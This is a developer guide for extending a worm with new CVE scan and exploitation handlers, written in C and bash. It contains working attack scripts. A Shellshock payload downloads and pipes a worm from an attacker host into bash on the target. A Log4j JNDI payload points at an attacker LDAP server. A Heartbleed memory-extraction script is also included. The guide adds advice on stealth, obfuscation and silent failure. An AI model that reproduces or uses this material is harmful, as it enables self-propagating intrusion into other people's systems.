# Adding New CVE Handlers: Step-by-Step Guide

## Overview

This guide walks you through adding a new CVE handler to the worm. Each CVE requires:
1. A **scan handler** (detects vulnerability)
2. An **execution handler** (exploits vulnerability)
3. **Registration** in the code

---

## Step 1: Define CVE ID

First, add a CVE ID constant in `handler_registry.h`.

**File**: `handler_registry.h`

**Location**: Add after existing CVE ID definitions

```c
// CVE IDs
#define CVE_2014_6271 1
#define CVE_2014_0160 2    // <-- Add your new CVE here
#define CVE_XXXX_XXXX 3    // <-- Example: Replace with your CVE
```

**Example**:
```c
#define CVE_2014_6271 1      // Shellshock
#define CVE_2014_0160 2      // Heartbleed
#define CVE_2021_44228 3     // Log4j
```

**Important**: Use a unique integer for each CVE. Don't reuse existing IDs.

---

## Step 2: Create Scan Handler Script

Create a scan script that detects if a target is vulnerable to your CVE.

### Template: Scan Handler

**File**: `scans/cve-XXXX-XXXX-scan.sh`

```bash
#!/bin/bash
# scans/cve-XXXX-XXXX-scan.sh
# Scan handler for CVE-XXXX-XXXX
# 
# API Requirements:
# - Input: Target IP as $1
# - Output: Standard format via stdout (see below)

TARGET_IP="$1"

# ============================================
# YOUR SCAN LOGIC HERE
# ============================================
# This is where you implement the vulnerability detection.
# You can use any method:
# - Network probes
# - Local file system checks
# - Service banner analysis
# - etc.
#
# Example:
# response=$(curl -s -m 5 "http://${TARGET_IP}/endpoint")
# if echo "$response" | grep -q "vulnerable"; then
#     VULNERABLE=1
#     CONFIDENCE=8
# else
#     VULNERABLE=0
#     CONFIDENCE=2
# fi

# ============================================
# OUTPUT (REQUIRED FORMAT)
# ============================================
# You MUST output these lines in this exact format.
# Order doesn't matter, but format must be exact.

echo "CVE_ID:CVE-XXXX-XXXX"        # Replace with your CVE ID
echo "VULNERABLE:${VULNERABLE}"     # 0 = not vulnerable, 1 = vulnerable
echo "CONFIDENCE:${CONFIDENCE}"     # 0-10 (how confident)
echo "PORT_OPEN:${PORT}"            # Port number if open, 0 if not
echo "SERVICE:${SERVICE_TYPE}"      # Service type (e.g., HTTP, HTTPS, SSH)

# Exit code: 0 = scan completed, non-zero = scan failed
exit 0
```

### Example: Shellshock Scan Handler

**File**: `scans/cve-2014-6271-scan.sh`

```bash
#!/bin/bash
# scans/cve-2014-6271-scan.sh
# Scan handler for CVE-2014-6271 (Shellshock)

TARGET_IP="$1"

# Test for Shellshock vulnerability
# Send HTTP request with Shellshock payload in User-Agent header
response=$(curl -s -m 5 -H "User-Agent: () { :; }; echo VULNERABLE" \
           "http://${TARGET_IP}/cgi-bin/status.cgi" 2>/dev/null)

# Check if response contains "VULNERABLE" (indicates Shellshock is active)
if echo "$response" | grep -q "VULNERABLE"; then
    VULNERABLE=1
    CONFIDENCE=8
    PORT=80
    SERVICE_TYPE="HTTP"
else
    VULNERABLE=0
    CONFIDENCE=3
    PORT=0
    SERVICE_TYPE=""
fi

# Output in standard format
echo "CVE_ID:CVE-2014-6271"
echo "VULNERABLE:${VULNERABLE}"
echo "CONFIDENCE:${CONFIDENCE}"
echo "PORT_OPEN:${PORT}"
echo "SERVICE:${SERVICE_TYPE}"

exit 0
```

### Example: Heartbleed Scan Handler

**File**: `scans/cve-2014-0160-scan.sh`

```bash
#!/bin/bash
# scans/cve-2014-0160-scan.sh
# Scan handler for CVE-2014-0160 (Heartbleed)

TARGET_IP="$1"

# Test for Heartbleed vulnerability
# Send malformed heartbeat request
response=$(openssl s_client -connect ${TARGET_IP}:443 -heartbleed 2>&1 | grep -q "heartbleed")

if [ $? -eq 0 ]; then
    VULNERABLE=1
    CONFIDENCE=9
    PORT=443
    SERVICE_TYPE="HTTPS"
else
    VULNERABLE=0
    CONFIDENCE=5
    PORT=0
    SERVICE_TYPE=""
fi

# Output in standard format
echo "CVE_ID:CVE-2014-0160"
echo "VULNERABLE:${VULNERABLE}"
echo "CONFIDENCE:${CONFIDENCE}"
echo "PORT_OPEN:${PORT}"
echo "SERVICE:${SERVICE_TYPE}"

exit 0
```

### Scan Handler API Requirements

**Input**:
- `$1` = Target IP address (e.g., "172.28.1.2")

**Output** (via stdout, one per line):
- `CVE_ID:CVE-XXXX-XXXX` - Your CVE identifier
- `VULNERABLE:0` or `VULNERABLE:1` - Is target vulnerable?
- `CONFIDENCE:0-10` - Confidence level (0 = low, 10 = high)
- `PORT_OPEN:port_number` - Port number if open, `0` if not
- `SERVICE:service_type` - Service type (e.g., HTTP, HTTPS, SSH) or empty

**Exit Code**:
- `0` = Scan completed successfully
- Non-zero = Scan failed (engine will treat as not vulnerable)

**Important Notes**:
- Output format is **case-sensitive** (must be exact: `VULNERABLE:`, `CONFIDENCE:`, etc.)
- Order of output lines doesn't matter
- Missing fields default to `0` or empty string
- Script must be executable (`chmod +x scans/cve-XXXX-XXXX-scan.sh`)

---

## Step 3: Create Execution Handler Script

Create an execution script that exploits the vulnerability.

### Template: Execution Handler

**File**: `executions/cve-XXXX-XXXX.sh`

```bash
#!/bin/bash
# executions/cve-XXXX-XXXX.sh
# Execution handler for CVE-XXXX-XXXX
#
# API Requirements:
# - Input: Target IP as $1
# - Output: Exit code (0 = success, non-zero = failure)

TARGET_IP="$1"

# ============================================
# YOUR EXPLOIT LOGIC HERE
# ============================================
# This is where you implement the exploit.
# You can:
# - Execute remote commands
# - Upload files
# - Perform privilege escalation
# - Self-replicate the worm
# - etc.
#
# Example:
# curl -s -m 10 -H "Exploit-Header: payload" \
#      "http://${TARGET_IP}/vulnerable-endpoint" >/dev/null 2>&1
#
# # Check if exploit was successful
# if [ $? -eq 0 ]; then
#     exit 0  # Success
# else
#     exit 1  # Failure
# fi

# ============================================
# EXIT CODE
# ============================================
# 0 = Exploit successful
# Non-zero = Exploit failed

exit 0  # or exit 1 for failure
```

### Example: Shellshock Execution Handler

**File**: `executions/cve-2014-6271.sh`

```bash
#!/bin/bash
# executions/cve-2014-6271.sh
# Execution handler for CVE-2014-6271 (Shellshock)

TARGET_IP="$1"
WORM_URL="http://attacker/worm"  # URL to fetch worm binary

# Build Shellshock payload
# This payload downloads and executes the worm
payload="() { :; }; /bin/bash -c 'wget -q -O- ${WORM_URL} | bash'"

# Execute exploit via HTTP User-Agent header
curl -s -m 10 -H "User-Agent: ${payload}" \
     "http://${TARGET_IP}/cgi-bin/status.cgi" >/dev/null 2>&1

# Check if exploit was successful
# (In a real implementation, you'd verify the worm is running)
if [ $? -eq 0 ]; then
    exit 0  # Success
else
    exit 1  # Failure
fi
```

### Example: Heartbleed Execution Handler

**File**: `executions/cve-2014-0160.sh`

```bash
#!/bin/bash
# executions/cve-2014-0160.sh
# Execution handler for CVE-2014-0160 (Heartbleed)

TARGET_IP="$1"

# Heartbleed exploit (simplified example)
# In reality, Heartbleed is an information disclosure vulnerability,
# not a remote code execution. This is just an example.

# Attempt to extract memory contents
openssl s_client -connect ${TARGET_IP}:443 -heartbleed >/tmp/heartbleed_output 2>&1

# Check if we got any data
if [ -s /tmp/heartbleed_output ]; then
    # Clean up
    rm -f /tmp/heartbleed_output
    exit 0  # Success (got data)
else
    exit 1  # Failure
fi
```

### Execution Handler API Requirements

**Input**:
- `$1` = Target IP address (e.g., "172.28.1.2")

**Output**:
- **Exit Code Only** (no stdout required)
  - `0` = Exploit successful
  - Non-zero = Exploit failed

**Important Notes**:
- Script should be **silent** (redirect output to `/dev/null`)
- Script should **clean up** temporary files
- Script should handle errors gracefully
- Script must be executable (`chmod +x executions/cve-XXXX-XXXX.sh`)

---

## Step 4: Make Scripts Executable

After creating the scripts, make them executable:

```bash
chmod +x scans/cve-XXXX-XXXX-scan.sh
chmod +x executions/cve-XXXX-XXXX.sh
```

---

## Step 5: Register Handler in Code

Register your handler in `handler_registry.c`.

**File**: `handler_registry.c`

**Location**: Inside `init_handler_registry()` function

```c
void init_handler_registry(void) {
    num_handlers = 0;
    
    // Register CVE-2014-6271 (Shellshock)
    handlers[0].cve_id = CVE_2014_6271;
    handlers[0].scan_script_path = "scans/cve-2014-6271-scan.sh";
    handlers[0].execution_script_path = "executions/cve-2014-6271.sh";
    handlers[0].priority_order = 1;
    num_handlers = 1;
    
    // Register CVE-2014-0160 (Heartbleed)
    handlers[1].cve_id = CVE_2014_0160;
    handlers[1].scan_script_path = "scans/cve-2014-0160-scan.sh";
    handlers[1].execution_script_path = "executions/cve-2014-0160.sh";
    handlers[1].priority_order = 2;
    num_handlers = 2;
    
    // ============================================
    // ADD YOUR NEW CVE HERE
    // ============================================
    handlers[num_handlers].cve_id = CVE_XXXX_XXXX;  // Your CVE ID
    handlers[num_handlers].scan_script_path = "scans/cve-XXXX-XXXX-scan.sh";
    handlers[num_handlers].execution_script_path = "executions/cve-XXXX-XXXX.sh";
    handlers[num_handlers].priority_order = 3;  // Set appropriate priority
    num_handlers++;
}
```

**Example**:
```c
// Register CVE-2021-44228 (Log4j)
handlers[num_handlers].cve_id = CVE_2021_44228;
handlers[num_handlers].scan_script_path = "scans/cve-2021-44228-scan.sh";
handlers[num_handlers].execution_script_path = "executions/cve-2021-44228.sh";
handlers[num_handlers].priority_order = 3;
num_handlers++;
```

**Important**:
- Use `num_handlers` as the array index (don't hardcode)
- Increment `num_handlers` after each registration
- Set `priority_order` appropriately (1 = highest priority)

---

## Step 6: Add Decision Rule

Add a decision rule in `decision_engine.c` to tell the engine when to use your CVE.

**File**: `decision_engine.c`

**Location**: Inside `init_decision_rules()` function

```c
void init_decision_rules(void) {
    num_rules = 0;
    
    // Decision rule for CVE-2014-6271
    decision_rules[0].cve_id = CVE_2014_6271;
    decision_rules[0].priority_order = 1;
    decision_rules[0].requires_vulnerable = 1;      // Must be vulnerable
    decision_rules[0].requires_port_open = 80;      // Port 80 must be open
    decision_rules[0].min_confidence = 7;           // Minimum confidence 7/10
    decision_rules[0].max_risk_level = 5;           // Don't use if risk > 5
    decision_rules[0].stealth_required = 0;         // Can use in normal mode
    num_rules = 1;
    
    // ============================================
    // ADD YOUR NEW DECISION RULE HERE
    // ============================================
    decision_rules[num_rules].cve_id = CVE_XXXX_XXXX;
    decision_rules[num_rules].priority_order = 3;  // Must match handler priority
    decision_rules[num_rules].requires_vulnerable = 1;  // 1 = must be vulnerable, 0 = optional
    decision_rules[num_rules].requires_port_open = 443;  // Port requirement (0 = no requirement)
    decision_rules[num_rules].min_confidence = 6;        // Minimum confidence (0-10)
    decision_rules[num_rules].max_risk_level = 6;        // Max risk to attempt (0-10)
    decision_rules[num_rules].stealth_required = 0;      // 1 = stealth only, 0 = normal or stealth
    num_rules++;
}
```

### Decision Rule Fields Explained

- **`cve_id`**: Must match the CVE ID you defined
- **`priority_order`**: Must match handler's priority_order (lower = higher priority)
- **`requires_vulnerable`**: 
  - `1` = CVE must be vulnerable (from scan)
  - `0` = Vulnerability check is optional
- **`requires_port_open`**: 
  - Port number (e.g., `80`, `443`) = This port must be open
  - `0` = No port requirement
- **`min_confidence`**: 
  - Minimum confidence level (0-10) from scan
  - Higher = more confident detection required
- **`max_risk_level`**: 
  - Maximum risk level (0-10) to attempt this CVE
  - Lower = more cautious (only use when risk is low)
- **`stealth_required`**: 
  - `1` = Only use in stealth mode
  - `0` = Can use in normal or stealth mode

**Example**:
```c
// Decision rule for CVE-2021-44228 (Log4j)
decision_rules[num_rules].cve_id = CVE_2021_44228;
decision_rules[num_rules].priority_order = 3;
decision_rules[num_rules].requires_vulnerable = 1;
decision_rules[num_rules].requires_port_open = 8080;  // Log4j often on port 8080
decision_rules[num_rules].min_confidence = 7;
decision_rules[num_rules].max_risk_level = 4;  // More cautious (lower risk threshold)
decision_rules[num_rules].stealth_required = 0;
num_rules++;
```

---

## Step 7: Rebuild and Test

After making all changes:

```bash
cd worm/CVE_aware
make clean
make
```

**Test your handler**:
1. Ensure scripts are executable
2. Test scan handler manually:
   ```bash
   ./scans/cve-XXXX-XXXX-scan.sh 172.28.1.2
   ```
   Should output standard format.

3. Test execution handler manually:
   ```bash
   ./executions/cve-XXXX-XXXX.sh 172.28.1.2
   echo $?  # Should output 0 (success) or non-zero (failure)
   ```

4. Run the worm and verify your CVE is detected and used.

---

## Complete Example: Adding CVE-2021-44228 (Log4j)

### Step 1: Define CVE ID

**File**: `handler_registry.h`
```c
#define CVE_2014_6271 1
#define CVE_2014_0160 2
#define CVE_2021_44228 3  // <-- Add this
```

### Step 2: Create Scan Handler

**File**: `scans/cve-2021-44228-scan.sh`
```bash
#!/bin/bash
# scans/cve-2021-44228-scan.sh
# Scan handler for CVE-2021-44228 (Log4j)

TARGET_IP="$1"

# Test for Log4j vulnerability
# Send JNDI lookup payload
response=$(curl -s -m 5 -H "X-Api-Version: \${jndi:ldap://test}" \
           "http://${TARGET_IP}:8080/api/endpoint" 2>/dev/null)

# Check for Log4j vulnerability indicators
if echo "$response" | grep -q "jndi\|ldap"; then
    VULNERABLE=1
    CONFIDENCE=8
    PORT=8080
    SERVICE_TYPE="HTTP"
else
    VULNERABLE=0
    CONFIDENCE=4
    PORT=0
    SERVICE_TYPE=""
fi

echo "CVE_ID:CVE-2021-44228"
echo "VULNERABLE:${VULNERABLE}"
echo "CONFIDENCE:${CONFIDENCE}"
echo "PORT_OPEN:${PORT}"
echo "SERVICE:${SERVICE_TYPE}"

exit 0
```

### Step 3: Create Execution Handler

**File**: `executions/cve-2021-44228.sh`
```bash
#!/bin/bash
# executions/cve-2021-44228.sh
# Execution handler for CVE-2021-44228 (Log4j)

TARGET_IP="$1"
ATTACKER_IP="172.28.1.1"  # Attacker's IP

# Log4j exploit payload
# JNDI lookup to malicious LDAP server
payload="\${jndi:ldap://${ATTACKER_IP}:1389/Exploit}"

# Send exploit payload
curl -s -m 10 -H "X-Api-Version: ${payload}" \
     "http://${TARGET_IP}:8080/api/endpoint" >/dev/null 2>&1

# Check if exploit was successful
if [ $? -eq 0 ]; then
    exit 0  # Success
else
    exit 1  # Failure
fi
```

### Step 4: Make Executable
```bash
chmod +x scans/cve-2021-44228-scan.sh
chmod +x executions/cve-2021-44228.sh
```

### Step 5: Register Handler

**File**: `handler_registry.c`
```c
void init_handler_registry(void) {
    num_handlers = 0;
    
    // ... existing handlers ...
    
    // Register CVE-2021-44228 (Log4j)
    handlers[num_handlers].cve_id = CVE_2021_44228;
    handlers[num_handlers].scan_script_path = "scans/cve-2021-44228-scan.sh";
    handlers[num_handlers].execution_script_path = "executions/cve-2021-44228.sh";
    handlers[num_handlers].priority_order = 3;
    num_handlers++;
}
```

### Step 6: Add Decision Rule

**File**: `decision_engine.c`
```c
void init_decision_rules(void) {
    num_rules = 0;
    
    // ... existing rules ...
    
    // Decision rule for CVE-2021-44228 (Log4j)
    decision_rules[num_rules].cve_id = CVE_2021_44228;
    decision_rules[num_rules].priority_order = 3;
    decision_rules[num_rules].requires_vulnerable = 1;
    decision_rules[num_rules].requires_port_open = 8080;
    decision_rules[num_rules].min_confidence = 7;
    decision_rules[num_rules].max_risk_level = 4;
    decision_rules[num_rules].stealth_required = 0;
    num_rules++;
}
```

### Step 7: Rebuild
```bash
make clean && make
```

---

## Checklist

When adding a new CVE handler, ensure:

- [ ] CVE ID defined in `handler_registry.h`
- [ ] Scan handler script created in `scans/` folder
- [ ] Execution handler script created in `executions/` folder
- [ ] Scripts are executable (`chmod +x`)
- [ ] Scan handler outputs standard format
- [ ] Execution handler returns proper exit codes
- [ ] Handler registered in `init_handler_registry()`
- [ ] Decision rule added in `init_decision_rules()`
- [ ] Priority order matches between handler and rule
- [ ] Code compiles without errors
- [ ] Scripts tested manually

---

## API Reference Summary

### Scan Handler API

**Input**: `$1` = Target IP

**Output** (stdout, one per line):
```
CVE_ID:CVE-XXXX-XXXX
VULNERABLE:0 or 1
CONFIDENCE:0-10
PORT_OPEN:port_number or 0
SERVICE:service_type or empty
```

**Exit Code**: `0` = success, non-zero = failure

### Execution Handler API

**Input**: `$1` = Target IP

**Output**: None (silent)

**Exit Code**: `0` = success, non-zero = failure

---

## Tips and Best Practices

1. **Stealth**: Make scripts undetectable (obfuscation, minimal footprint)
2. **Error Handling**: Fail silently, clean up temporary files
3. **Efficiency**: Use single connections, batch tests when possible
4. **Testing**: Test scripts manually before integrating
5. **Documentation**: Comment your scripts with what they do
6. **Priority**: Set appropriate priority (higher impact = higher priority)
7. **Risk Threshold**: Set `max_risk_level` based on CVE's detectability

---

This guide provides everything you need to add new CVE handlers to the worm!

